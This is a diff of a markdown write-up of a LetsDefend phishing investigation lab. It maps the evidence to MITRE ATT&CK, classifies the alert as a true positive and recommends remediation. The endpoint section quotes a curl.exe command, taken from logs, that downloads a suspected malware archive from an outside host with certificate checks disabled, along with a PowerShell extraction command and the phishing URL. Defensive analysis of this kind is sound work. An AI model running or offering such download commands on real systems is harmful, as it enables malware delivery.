@@ -1,6 +1,5 @@
 ---
 title: LetsDefend Phishing Investigation
-parent: SOC Investigations
 nav_order: 2
 ---
 
@@ -26,15 +25,55 @@ VirusTotal reported 15 detections out of 98 for the download URL, with classific
 
 ## Investigation Findings
 
-**Email analysis:** The email contained a suspicious hyperlink directing the recipient to `blockchainjobhub.com/invite/E3fM8yF7`. The URL was identified as malicious through threat intelligence checks.
+### Email Analysis
 
-**Delivery and user activity:** The email security alert recorded the message as allowed. The playbook indicated that the recipient accessed the malicious URL and downloaded and opened a file.
+The email contained a suspicious hyperlink directing the recipient to:
 
-**Endpoint activity:** Process logs showed `curl.exe` downloading `nvidiaupdate.zip`, followed by PowerShell extracting the archive into the user's directory. This activity is consistent with a potential malware delivery chain.
+`https://blockchainjobhub.com/invite/E3fM8yF7`
 
-**Threat intelligence:** VirusTotal flagged the download URL, supporting the assessment that the activity was malicious. The alert referenced Lazarus Group (APT38), but the evidence reviewed does not independently establish attribution to that group.
+The URL was identified as malicious through threat intelligence checks.
 
-**Email headers:** The `From` and `Return-Path` fields matched in the EML file. This does not rule out a malicious sender or establish the sender's identity.
+### Delivery and User Activity
+
+The email security alert recorded the message as allowed. The LetsDefend playbook indicated that the recipient accessed the malicious URL and downloaded and opened a file.
+
+### Endpoint Activity
+
+Process logs showed `curl.exe` downloading `nvidiaupdate.zip`, followed by PowerShell extracting the archive into the user's directory.
+
+The download command was:
+
+```powershell
+curl.exe -k -o "C:\Users\LetsDefend\nvidiaupdate.zip" https://api.drivercams.cloud/nvidia-al.update
+```
+
+The `-k` option disables TLS certificate verification. Although this is not inherently malicious, it is worth noting in the context of the other suspicious activity.
+
+Sysmon Event ID 1 recorded PowerShell executing the following command at approximately 00:25:26 UTC on 7 March 2025:
+
+```powershell
+Expand-Archive -Force -Path 'C:\Users\LetsDefend\nvidiaupdate.zip' -DestinationPath 'C:\Users\LetsDefend\nvidiadrive'
+```
+
+This confirms that PowerShell was instructed to extract the archive. The available process-creation event does not independently confirm that any extracted files were subsequently executed.
+
+### Threat Intelligence
+
+VirusTotal flagged the download URL, with 15 out of 98 security vendors detecting it as malicious. Reported classifications included Trojan and Downloader.
+
+The alert referenced Lazarus Group (APT38), but the evidence reviewed does not independently establish attribution to this group.
+
+### Email Header Analysis
+
+The `From` and `Return-Path` fields matched in the EML file. However, matching these fields does not rule out a malicious sender or establish the sender's identity.
+
+## MITRE ATT&CK
+
+- **T1566 - Phishing:** Relevant to the suspicious email.
+- **T1105 - Ingress Tool Transfer:** Consistent with the observed file download.
+- **T1059.001 - PowerShell:** PowerShell was used to extract the downloaded archive.
+
+These techniques describe behaviours relevant to the investigation and do not independently establish that every technique was successfully used by an attacker.
 
 ## Assessment
 
@@ -42,16 +81,20 @@ The alert is classified as a **True Positive** because the investigation identif
 
 The available evidence does not independently confirm whether the extracted payload was executed, whether persistence was established, or whether data was compromised.
 
+The full extent of the potential compromise remains undetermined.
+
 ## Recommended Actions
 
 - Remove the phishing email from the recipient's mailbox if it remains present.
 - Investigate the downloaded archive and its extracted contents.
-- Review endpoint logs for further execution, persistence, or suspicious network connections.
+- Review endpoint logs for further execution, persistence, and suspicious network connections.
 - Block confirmed malicious URLs and domains through the appropriate security controls.
 - Contain the endpoint if further investigation indicates active compromise.
 
 ## Conclusion
 
-The investigation supports the True Positive classification. A malicious phishing URL was identified, and subsequent endpoint activity showed a suspicious download followed by archive extraction.
+The investigation identified a malicious phishing URL and subsequent endpoint activity involving a suspicious file download and PowerShell archive extraction.
 
-Further investigation would be required to establish the full impact on the endpoint and determine whether the downloaded payload was executed.
+The evidence supports the True Positive classification and is consistent with malware delivery. Further investigation would be required to determine whether the downloaded payload was executed and to establish the full impact on the endpoint.
+
+Attribution to Lazarus Group remains unconfirmed.
